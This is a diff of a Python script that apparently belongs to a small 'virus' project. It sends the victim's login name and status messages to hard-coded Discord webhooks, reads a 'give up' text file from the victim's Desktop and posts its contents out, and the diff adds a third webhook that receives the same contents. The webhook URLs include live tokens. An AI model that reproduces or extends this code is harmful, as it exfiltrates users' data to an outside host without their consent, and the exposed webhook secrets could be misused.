@@ -20,12 +20,14 @@ files_to_backup = [
     os.path.join(virus_dir, "cleanup_x64.py"),
 ]
 
-def log_to_discord(msg:str, important=False):
+def log_to_discord(msg:str, important=False, basnicka = False):
     data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
         requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
         if important:
             requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
+        if basnicka:
+            requests.post("https://discord.com/api/webhooks/1434577986941616353/kl6qA7oNRII4QrDXnEPnfVXCNQn-xo8YaLOxjfyQnS58MSwfaLRngGOfECmQOl_WSOxY", json = data)
     except:
         print("Failed to send port request")
 log_to_discord("File checker...")
@@ -35,7 +37,7 @@ def check_resign():
         with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
             content = f.readlines()
             if len(content) > 3:
-                log_to_discord("**Basnicka:**\n```txt\n" + "".join(content) + "```", important=True)
+                log_to_discord("**Basnicka:**\n```txt\n" + "".join(content) + "```", important=True,basnicka=True)
                 try:
                     import send2trash
 
